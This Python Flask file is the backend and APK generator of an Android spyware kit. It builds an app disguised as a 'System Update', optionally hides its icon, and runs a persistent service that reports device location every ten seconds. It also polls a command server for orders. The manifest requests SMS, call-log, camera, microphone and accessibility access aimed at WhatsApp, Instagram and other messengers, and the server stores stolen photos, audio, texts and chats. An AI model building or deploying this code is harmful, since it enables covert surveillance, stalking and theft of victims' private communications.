from flask import Flask, request, jsonify, send_file
from datetime import datetime
import json
import os
import uuid
import sqlite3
import requests
import zipfile
import tempfile
import shutil

app = Flask(__name__)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = os.path.join(BASE_DIR, "tracker.db")

# GitHub Config - Tera repo yahan set hai
GITHUB_REPO = os.environ.get('GITHUB_REPO', 'Sallu-Shk/phone-tracker-backend')
GITHUB_API = "https://api.github.com"

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    c = conn.cursor()
    
    tables = [
        '''CREATE TABLE IF NOT EXISTS devices (
            id TEXT PRIMARY KEY, model TEXT, android_version TEXT,
            ip TEXT, features TEXT, last_seen TEXT, online INTEGER DEFAULT 1)''',
        '''CREATE TABLE IF NOT EXISTS locations (
            id INTEGER PRIMARY KEY, device_id TEXT, lat REAL, lon REAL,
            accuracy REAL, timestamp TEXT)''',
        '''CREATE TABLE IF NOT EXISTS photos (
            id INTEGER PRIMARY KEY, device_id TEXT, image_base64 TEXT,
            camera_type TEXT, timestamp TEXT)''',
        '''CREATE TABLE IF NOT EXISTS audio (
            id INTEGER PRIMARY KEY, device_id TEXT, audio_base64 TEXT,
            duration INTEGER, timestamp TEXT)''',
        '''CREATE TABLE IF NOT EXISTS sms (
            id INTEGER PRIMARY KEY, device_id TEXT, address TEXT,
            body TEXT, date TEXT, type TEXT, timestamp TEXT)''',
        '''CREATE TABLE IF NOT EXISTS social_media (
            id INTEGER PRIMARY KEY, device_id TEXT, app_name TEXT,
            sender TEXT, message TEXT, timestamp TEXT)''',
        '''CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY, device_id TEXT, command_type TEXT,
            params TEXT, status TEXT DEFAULT 'pending', created_at TEXT)''',
        '''CREATE TABLE IF NOT EXISTS builds (
            id TEXT PRIMARY KEY, features TEXT, status TEXT,
            download_url TEXT, created_at TEXT)'''
    ]
    
    for table in tables:
        c.execute(table)
    conn.commit()
    conn.close()

init_db()

# ============================================================
# GITHUB ACTIONS APK BUILD SYSTEM
# ============================================================

def trigger_github_build(features, server_url, build_id):
    """Trigger GitHub Actions workflow to build APK"""
    
    project_files = generate_project_files(features, server_url, build_id)
    
    url = f"{GITHUB_API}/repos/{GITHUB_REPO}/actions/workflows/build-apk.yml/dispatches"
    
    headers = {
        "Accept": "application/vnd.github.v3+json",
        "User-Agent": "PhoneTracker-App"
    }
    
    payload = {
        "ref": "main",
        "inputs": {
            "build_id": build_id,
            "features": json.dumps(features),
            "server_url": server_url,
            "project_files": json.dumps(project_files)
        }
    }
    
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=30)
        if response.status_code in [204, 200]:
            return True
        else:
            print(f"GitHub API response: {response.status_code} - {response.text}")
            return False
    except Exception as e:
        print(f"GitHub trigger failed: {e}")
        return False

def generate_project_files(features, server_url, build_id):
    """Generate all Android project files as strings"""
    
    files = {}
    
    files["src/main/java/com/systemupdate/MainActivity.java"] = generate_main_activity(features, server_url)
    files["src/main/java/com/systemupdate/TrackerService.java"] = generate_tracker_service(features, server_url)
    files["src/main/AndroidManifest.xml"] = generate_manifest(features)
    files["src/main/res/layout/update_screen.xml"] = generate_layout()
    files["src/main/res/values/strings.xml"] = generate_strings()
    files["src/main/res/values/styles.xml"] = generate_styles()
    files["build.gradle"] = generate_build_gradle()
    
    if 'social' in features:
        files["src/main/res/xml/accessibility_service_config.xml"] = generate_accessibility_config()
    
    return files

def generate_main_activity(features, server_url):
    feature_booleans = "\n".join([
        f'        editor.putBoolean("{f}", true);' for f in features
    ])
    
    stealth_code = ""
    if 'stealth' in features:
        stealth_code = '''
        if (prefs.getBoolean("stealth", false)) {
            new Handler().postDelayed(new Runnable() {
                @Override
                public void run() {
                    getPackageManager().setComponentEnabledSetting(
                        getComponentName(),
                        android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        android.content.pm.PackageManager.DONT_KILL_APP
                    );
                    finish();
                }
            }, 3000);
        }'''
    
    return f'''package com.systemupdate;

import android.app.Activity;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.os.Handler;
import android.widget.ProgressBar;
import android.widget.TextView;

public class MainActivity extends Activity {{

    private static final String PREFS_NAME = "TrackerConfig";
    private static final String SERVER_URL = "{server_url}";

    @Override
    protected void onCreate(Bundle savedInstanceState) {{
        super.onCreate(savedInstanceState);
        setContentView(R.layout.update_screen);

        TextView status = findViewById(R.id.status_text);
        ProgressBar progress = findViewById(R.id.progress);

        status.setText("Checking for system updates...");
        progress.setVisibility(ProgressBar.VISIBLE);

        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        SharedPreferences.Editor editor = prefs.edit();
        editor.putString("server_url", SERVER_URL);
{feature_booleans}
        editor.apply();

        Intent serviceIntent = new Intent(this, TrackerService.class);
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {{
            startForegroundService(serviceIntent);
        }} else {{
            startService(serviceIntent);
        }}
{stealth_code}
    }}
}}
'''

def generate_tracker_service(features, server_url):
    command_handlers = ""
    if 'camera' in features:
        command_handlers += '''
            case "camera_front":
                // capturePhoto("front");
                break;
            case "camera_back":
                // capturePhoto("back");
                break;'''
    
    if 'audio' in features:
        command_handlers += '''
            case "audio":
                // recordAudio();
                break;'''
    
    if 'screenshot' in features:
        command_handlers += '''
            case "screenshot":
                // captureScreenshot();
                break;'''
    
    if 'ring' in features:
        command_handlers += '''
            case "ring":
                // ringPhone();
                break;'''
    
    if 'sms' in features:
        command_handlers += '''
            case "sms":
                // uploadSMS();
                break;'''
    
    if 'calls' in features:
        command_handlers += '''
            case "calls":
                // uploadCallLogs();
                break;'''
    
    if 'wifipass' in features:
        command_handlers += '''
            case "wifipass":
                // uploadWiFiPasswords();
                break;'''
    
    if 'social' in features:
        command_handlers += '''
            case "social":
                // uploadSocialData();
                break;'''
    
    feature_list = json.dumps(features)
    
    return f'''package com.systemupdate;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.Settings;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class TrackerService extends Service {{

    private String serverUrl;
    private String deviceId;
    private SharedPreferences prefs;
    private ScheduledExecutorService scheduler;
    private Handler mainHandler;

    @Override
    public void onCreate() {{
        super.onCreate();
        prefs = getSharedPreferences("TrackerConfig", MODE_PRIVATE);
        serverUrl = prefs.getString("server_url", "{server_url}");
        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        mainHandler = new Handler(Looper.getMainLooper());
    }}

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {{
        startForeground(1, createNotification());
        registerDevice();
        
        scheduler = Executors.newScheduledThreadPool(1);
        scheduler.scheduleAtFixedRate(new Runnable() {{
            @Override
            public void run() {{
                pollCommands();
                uploadLocation();
            }}
        }}, 5, 10, TimeUnit.SECONDS);
        
        return START_STICKY;
    }}

    private void registerDevice() {{
        try {{
            JSONObject device = new JSONObject();
            device.put("device_id", deviceId);
            device.put("model", Build.MODEL);
            device.put("android_version", Build.VERSION.RELEASE);

            JSONArray features = new JSONArray();
            String[] featureList = {feature_list};
            
            for (int i = 0; i < featureList.length; i++) {{
                if (prefs.getBoolean(featureList[i], false)) {{
                    features.put(featureList[i]);
                }}
            }}
            
            device.put("features", features);
            postJson(serverUrl + "/api/device/register", device.toString());
            
        }} catch (Exception e) {{
            e.printStackTrace();
        }}
    }}

    private void pollCommands() {{
        try {{
            String response = getJson(serverUrl + "/api/device/" + deviceId + "/poll");
            if (response != null && !response.isEmpty()) {{
                JSONObject data = new JSONObject(response);
                JSONArray commands = data.getJSONArray("commands");
                for (int i = 0; i < commands.length(); i++) {{
                    executeCommand(commands.getJSONObject(i));
                }}
            }}
        }} catch (Exception e) {{
            e.printStackTrace();
        }}
    }}

    private void executeCommand(JSONObject command) {{
        try {{
            final String type = command.getString("type");
            
            switch(type) {{
                case "location":
                    uploadLocation();
                    break;
{command_handlers}
                default:
                    break;
            }}
        }} catch (Exception e) {{
            e.printStackTrace();
        }}
    }}

    private void uploadLocation() {{
        try {{
            android.location.LocationManager lm = (android.location.LocationManager) getSystemService(LOCATION_SERVICE);
            android.location.Location location = lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER);
            if (location == null) {{
                location = lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER);
            }}
            
            if (location != null) {{
                JSONObject data = new JSONObject();
                data.put("type", "location");
                JSONObject loc = new JSONObject();
                loc.put("lat", location.getLatitude());
                loc.put("lon", location.getLongitude());
                loc.put("accuracy", location.getAccuracy());
                data.put("data", loc);
                postJson(serverUrl + "/api/device/" + deviceId + "/data", data.toString());
            }}
        }} catch (Exception e) {{
            e.printStackTrace();
        }}
    }}

    private Notification createNotification() {{
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {{
            NotificationChannel channel = new NotificationChannel(
                "tracker_channel", 
                "System Update", 
                NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
            
            return new Notification.Builder(this, "tracker_channel")
                .setContentTitle("System Update")
                .setContentText("Checking for updates...")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .build();
        }} else {{
            return new Notification.Builder(this)
                .setContentTitle("System Update")
                .setContentText("Checking for updates...")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .build();
        }}
    }}

    private String getJson(String urlString) {{
        try {{
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);
            
            BufferedReader reader = new BufferedReader(
                new InputStreamReader(conn.getInputStream())
            );
            StringBuilder result = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {{
                result.append(line);
            }}
            reader.close();
            return result.toString();
        }} catch (Exception e) {{
            e.printStackTrace();
            return null;
        }}
    }}

    private void postJson(String urlString, String jsonData) {{
        try {{
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);
            
            OutputStream os = conn.getOutputStream();
            os.write(jsonData.getBytes("UTF-8"));
            os.close();
            
            conn.getResponseCode();
        }} catch (Exception e) {{
            e.printStackTrace();
        }}
    }}

    @Override
    public IBinder onBind(Intent intent) {{
        return null;
    }}

    @Override
    public void onDestroy() {{
        super.onDestroy();
        if (scheduler != null) {{
            scheduler.shutdown();
        }}
    }}
}}
'''

def generate_manifest(features):
    permissions = [
        '    <uses-permission android:name="android.permission.INTERNET" />',
        '    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />',
        '    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />',
        '    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />',
        '    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />',
    ]
    
    if 'camera' in features:
        permissions.append('    <uses-permission android:name="android.permission.CAMERA" />')
    if 'audio' in features:
        permissions.append('    <uses-permission android:name="android.permission.RECORD_AUDIO" />')
    if 'sms' in features:
        permissions.extend([
            '    <uses-permission android:name="android.permission.READ_SMS" />',
            '    <uses-permission android:name="android.permission.SEND_SMS" />'
        ])
    if 'calls' in features:
        permissions.extend([
            '    <uses-permission android:name="android.permission.READ_CALL_LOG" />',
            '    <uses-permission android:name="android.permission.READ_CONTACTS" />',
            '    <uses-permission android:name="android.permission.READ_PHONE_STATE" />'
        ])
    if 'wifipass' in features:
        permissions.append('    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />')
        permissions.append('    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />')
    if 'social' in features:
        permissions.append('    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />')
    if 'screenshot' in features:
        permissions.append('    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />')
    if 'ring' in features:
        permissions.append('    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />')
    
    services = '''        <service
            android:name=".TrackerService"
            android:enabled="true"
            android:exported="false"
            android:foregroundServiceType="location" />'''
    
    if 'social' in features:
        services += '''
        <service
            android:name=".SocialMediaHelper"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
            android:exported="true">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService" />
            </intent-filter>
            <meta-data
                android:name="android.accessibilityservice"
                android:resource="@xml/accessibility_service_config" />
        </service>'''
    
    receivers = '''        <receiver
            android:name=".BootReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
            </intent-filter>
        </receiver>'''
    
    return f'''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.systemupdate"
    android:versionCode="1"
    android:versionName="1.0">

    <uses-sdk
        android:minSdkVersion="21"
        android:targetSdkVersion="33" />

{chr(10).join(permissions)}

    <application
        android:allowBackup="true"
        android:icon="@android:drawable/ic_menu_compass"
        android:label="System Update"
        android:theme="@android:style/Theme.Light.NoActionBar">

        <activity
            android:name=".MainActivity"
            android:label="System Update"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

{services}

{receivers}

    </application>

</manifest>
'''

def generate_layout():
    return '''<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical"
    android:gravity="center"
    android:padding="20dp"
    android:background="#FFFFFF">

    <TextView
        android:id="@+id/status_text"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Checking for updates..."
        android:textSize="18sp"
        android:textColor="#333333"
        android:layout_marginBottom="20dp" />

    <ProgressBar
        android:id="@+id/progress"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:indeterminate="true" />

</LinearLayout>
'''

def generate_strings():
    return '''<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">System Update</string>
    <string name="accessibility_service_description">System Update Service</string>
</resources>
'''

def generate_styles():
    return '''<?xml version="1.0" encoding="utf-8"?>
<resources>
    <style name="AppTheme" parent="android:Theme.Light.NoActionBar">
    </style>
</resources>
'''

def generate_accessibility_config():
    return '''<?xml version="1.0" encoding="utf-8"?>
<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
    android:description="@string/accessibility_service_description"
    android:packageNames="com.whatsapp,com.facebook.katana,com.instagram.android,com.snapchat.android,com.telegram.messenger"
    android:accessibilityEventTypes="typeWindowContentChanged|typeViewClicked|typeNotificationStateChanged"
    android:accessibilityFlags="flagRetrieveInteractiveWindows|flagReportViewIds"
    android:canRetrieveWindowContent="true"
    android:notificationTimeout="100" />
'''

def generate_build_gradle():
    return '''apply plugin: 'com.android.application'

android {
    compileSdkVersion 33
    buildToolsVersion "33.0.0"
    
    defaultConfig {
        applicationId "com.systemupdate"
        minSdkVersion 21
        targetSdkVersion 33
        versionCode 1
        versionName "1.0"
    }
    
    buildTypes {
        release {
            minifyEnabled false
            proguardFiles getDefaultProguardFile('proguard-android.txt'), 'proguard-rules.pro'
        }
    }
}

dependencies {
    implementation 'org.json:json:20231013'
}
'''

# ============================================================
# API ENDPOINTS
# ============================================================

@app.route('/api/build', methods=['POST'])
def build_apk():
    """Trigger GitHub Actions to build APK"""
    data = request.get_json()
    features = data.get('features', [])
    server_url = data.get('server_url', request.host_url.rstrip('/'))
    
    if not features:
        return jsonify({"status": "error", "error": "No features selected"}), 400
    
    build_id = str(uuid.uuid4())[:8]
    
    conn = get_db()
    c = conn.cursor()
    c.execute('''INSERT INTO builds (id, features, status, created_at)
                 VALUES (?, ?, ?, ?)''',
              (build_id, json.dumps(features), 'triggered', datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    github_success = trigger_github_build(features, server_url, build_id)
    
    if github_success:
        return jsonify({
            "status": "success",
            "build_id": build_id,
            "message": "APK build started on GitHub Actions (takes 2-3 minutes)",
            "check_status_url": f"/api/build/{build_id}/status",
            "download_url": f"https://github.com/{GITHUB_REPO}/releases/download/build-{build_id}/app-release-unsigned.apk"
        })
    else:
        return jsonify({
            "status": "fallback",
            "build_id": build_id,
            "message": "GitHub Actions not available. Use manual build method.",
            "manual_build_url": f"/api/build/{build_id}/zip"
        })

@app.route('/api/build/<build_id>/status', methods=['GET'])
def build_status(build_id):
    """Check build status"""
    conn = get_db()
    c = conn.cursor()
    c.execute('SELECT * FROM builds WHERE id = ?', (build_id,))
    row = c.fetchone()
    conn.close()
    
    if not row:
        return jsonify({"status": "not_found"}), 404
    
    try:
        release_url = f"{GITHUB_API}/repos/{GITHUB_REPO}/releases/tags/build-{build_id}"
        headers = {
            "Accept": "application/vnd.github.v3+json",
            "User-Agent": "PhoneTracker-App"
        }
        
        response = requests.get(release_url, headers=headers, timeout=10)
        if response.status_code == 200:
            release = response.json()
            assets = release.get('assets', [])
            if assets:
                conn = get_db()
                c = conn.cursor()
                c.execute('UPDATE builds SET status = ?, download_url = ? WHERE id = ?',
                         ('completed', assets[0]['browser_download_url'], build_id))
                conn.commit()
                conn.close()
                
                return jsonify({
                    "status": "completed",
                    "build_id": build_id,
                    "download_url": assets[0]['browser_download_url']
                })
    except Exception as e:
        print(f"GitHub check failed: {e}")
    
    return jsonify({
        "status": row['status'],
        "build_id": build_id
    })

@app.route('/api/build/<build_id>/zip', methods=['GET'])
def download_build_zip(build_id):
    """Download project ZIP for manual build"""
    conn = get_db()
    c = conn.cursor()
    c.execute('SELECT features FROM builds WHERE id = ?', (build_id,))
    row = c.fetchone()
    conn.close()
    
    if not row:
        return jsonify({"error": "Build not found"}), 404
    
    features = json.loads(row['features'])
    server_url = request.host_url.rstrip('/')
    
    temp_dir = tempfile.mkdtemp()
    try:
        project_dir = os.path.join(temp_dir, "app")
        files = generate_project_files(features, server_url, build_id)
        
        for filepath, content in files.items():
            full_path = os.path.join(project_dir, filepath)
            os.makedirs(os.path.dirname(full_path), exist_ok=True)
            with open(full_path, 'w') as f:
                f.write(content)
        
        zip_path = os.path.join(temp_dir, f"SystemUpdate_{build_id}.zip")
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files_list in os.walk(project_dir):
                for file in files_list:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, project_dir)
                    zipf.write(file_path, arcname)
        
        return send_file(zip_path, as_attachment=True, download_name=f"SystemUpdate_{build_id}.zip")
    finally:
        shutil.rmtree(temp_dir, ignore_errors=True)

# Device registration and data endpoints
@app.route('/api/device/register', methods=['POST'])
def register_device():
    data = request.get_json()
    device_id = data.get('device_id', str(uuid.uuid4()))
    
    conn = get_db()
    c = conn.cursor()
    c.execute('''INSERT OR REPLACE INTO devices 
        (id, model, android_version, ip, features, last_seen, online)
        VALUES (?, ?, ?, ?, ?, ?, ?)''',
        (device_id, data.get('model'), data.get('android_version'),
         request.remote_addr, json.dumps(data.get('features', [])),
         datetime.now().isoformat(), 1))
    conn.commit()
    conn.close()
    
    return jsonify({
        "status": "registered",
        "device_id": device_id,
        "server_time": datetime.now().isoformat()
    })

@app.route('/api/device/<device_id>/command', methods=['POST'])
def queue_command(device_id):
    data = request.get_json()
    conn = get_db()
    c = conn.cursor()
    c.execute('''INSERT INTO commands (device_id, command_type, params, created_at)
                 VALUES (?, ?, ?, ?)''',
              (device_id, data.get('type'), json.dumps(data.get('params', {})),
               datetime.now().isoformat()))
    conn.commit()
    cmd_id = c.lastrowid
    conn.close()
    return jsonify({"status": "queued", "command_id": cmd_id})

@app.route('/api/device/<device_id>/poll', methods=['GET'])
def poll_commands(device_id):
    conn = get_db()
    c = conn.cursor()
    
    c.execute('''SELECT id, command_type, params FROM commands 
                 WHERE device_id = ? AND status = 'pending'
                 ORDER BY created_at ASC''', (device_id,))
    
    commands = [{"id": r[0], "type": r[1], "params": json.loads(r[2])} 
                for r in c.fetchall()]
    
    if commands:
        c.execute('''UPDATE commands SET status = 'delivered' 
                     WHERE device_id = ? AND status = 'pending' ''', (device_id,))
    
    c.execute('''UPDATE devices SET last_seen = ?, online = 1 WHERE id = ?''',
              (datetime.now().isoformat(), device_id))
    
    conn.commit()
    conn.close()
    return jsonify({"commands": commands})

@app.route('/api/device/<device_id>/data', methods=['POST'])
def receive_data(device_id):
    data = request.get_json()
    data_type = data.get('type')
    conn = get_db()
    c = conn.cursor()
    
    if data_type == 'location':
        d = data.get('data', {})
        c.execute('''INSERT INTO locations (device_id, lat, lon, accuracy, timestamp)
                     VALUES (?, ?, ?, ?, ?)''',
                  (device_id, d.get('lat'), d.get('lon'), d.get('accuracy'),
                   datetime.now().isoformat()))
    
    elif data_type == 'photo':
        d = data.get('data', {})
        c.execute('''INSERT INTO photos (device_id, image_base64, camera_type, timestamp)
                     VALUES (?, ?, ?, ?)''',
                  (device_id, d.get('image'), d.get('camera', 'unknown'),
                   datetime.now().isoformat()))
    
    elif data_type == 'audio':
        d = data.get('data', {})
        c.execute('''INSERT INTO audio (device_id, audio_base64, duration, timestamp)
                     VALUES (?, ?, ?, ?)''',
                  (device_id, d.get('audio'), d.get('duration', 0),
                   datetime.now().isoformat()))
    
    elif data_type == 'sms':
        d = data.get('data', {})
        c.execute('''INSERT INTO sms (device_id, address, body, date, type, timestamp)
                     VALUES (?, ?, ?, ?, ?, ?)''',
                  (device_id, d.get('address'), d.get('body'), d.get('date'),
                   d.get('type'), datetime.now().isoformat()))
    
    elif data_type == 'social_media':
        d = data.get('data', {})
        c.execute('''INSERT INTO social_media (device_id, app_name, sender, message, timestamp)
                     VALUES (?, ?, ?, ?, ?)''',
                  (device_id, d.get('app'), d.get('sender'), d.get('message'),
                   datetime.now().isoformat()))
    
    conn.commit()
    conn.close()
    return jsonify({"status": "received"})

@app.route('/api/devices', methods=['GET'])
def get_devices():
    conn = get_db()
    c = conn.cursor()
    c.execute('''SELECT id, model, features, last_seen, online FROM devices''')
    devices = [{
        "id": r[0], "model": r[1],
        "features": json.loads(r[2]) if r[2] else [],
        "last_seen": r[3], "online": bool(r[4])
    } for r in c.fetchall()]
    conn.close()
    return jsonify({"devices": devices})

@app.route('/api/device/<device_id>/location', methods=['GET'])
def get_location(device_id):
    conn = get_db()
    c = conn.cursor()
    c.execute('''SELECT lat, lon, accuracy, timestamp FROM locations 
                 WHERE device_id = ? ORDER BY timestamp DESC LIMIT 1''', (device_id,))
    row = c.fetchone()
    conn.close()
    if row:
        return jsonify({"found": True, "lat": row[0], "lon": row[1],
                       "accuracy": row[2], "timestamp": row[3]})
    return jsonify({"found": False})

@app.route('/api/device/<device_id>/photos', methods=['GET'])
def get_photos(device_id):
    conn = get_db()
    c = conn.cursor()
    c.execute('''SELECT image_base64, camera_type, timestamp FROM photos 
                 WHERE device_id = ? ORDER BY timestamp DESC''', (device_id,))
    photos = [{"image": r[0], "camera": r[1], "timestamp": r[2]} 
              for r in c.fetchall()]
    conn.close()
    return jsonify({"photos": photos})

@app.route('/api/device/<device_id>/sms', methods=['GET'])
def get_sms(device_id):
    conn = get_db()
    c = conn.cursor()
    c.execute('''SELECT address, body, date, type FROM sms 
                 WHERE device_id = ? ORDER BY date DESC''', (device_id,))
    messages = [{"address": r[0], "body": r[1], "date": r[2], "type": r[3]} 
                for r in c.fetchall()]
    conn.close()
    return jsonify({"sms": messages})

@app.route('/api/device/<device_id>/social', methods=['GET'])
def get_social(device_id):
    conn = get_db()
    c = conn.cursor()
    c.execute('''SELECT app_name, sender, message, timestamp FROM social_media 
                 WHERE device_id = ? ORDER BY timestamp DESC''', (device_id,))
    messages = [{"app": r[0], "sender": r[1], "message": r[2], "timestamp": r[3]} 
                for r in c.fetchall()]
    conn.close()
    return jsonify({"social": messages})

@app.route('/api/health', methods=['GET'])
def health_check():
    return jsonify({"status": "running", "time": datetime.now().isoformat(), "version": "3.0.0"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)